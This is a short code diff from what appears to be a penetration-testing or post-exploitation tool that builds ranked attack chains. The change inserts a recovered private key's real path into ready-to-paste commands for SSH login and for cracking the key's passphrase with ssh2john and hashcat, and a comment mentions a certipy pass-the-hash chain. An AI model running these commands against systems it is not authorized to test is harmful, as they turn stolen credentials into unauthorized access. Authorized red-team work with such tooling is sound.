@@ -563,10 +563,15 @@ def run(report, store, ui=None):
     if e.has_pkey:
         s, l = e.pkey_src
         sh = host("ssh")
+        # iter-72: substitute the real key file path so the operator gets
+        # 'chmod 600 /loot/id_rsa; ssh -i /loot/id_rsa <user>@target'
+        # ready to paste. src is guaranteed set when has_pkey fired (see
+        # _entities()); fall back to placeholder for defensive safety.
+        _kf = s if s else "<keyfile>"
         chains.append(Chain("R17", "ssh key", "private key recovered",
             crit=6, conf=0.7, ready=1.3, prox=_prox(store, sh),
-            commands=[f"chmod 600 <keyfile>; ssh -i <keyfile> <user>@{sh}",
-                      "if ENCRYPTED: ssh2john <keyfile> > k; hashcat -m 22921 k rockyou.txt"],
+            commands=[f"chmod 600 '{_kf}'; ssh -i '{_kf}' <user>@{sh}",
+                      f"if ENCRYPTED: ssh2john '{_kf}' > k; hashcat -m 22921 k rockyou.txt"],
             src=s, line=l))
     # cert / pfx -> certipy -> PtH. iter-13: ADCS PKINIT is a one-command
     # paste (certipy auth -pfx); under-rated vs GPP/PtH despite same effort.
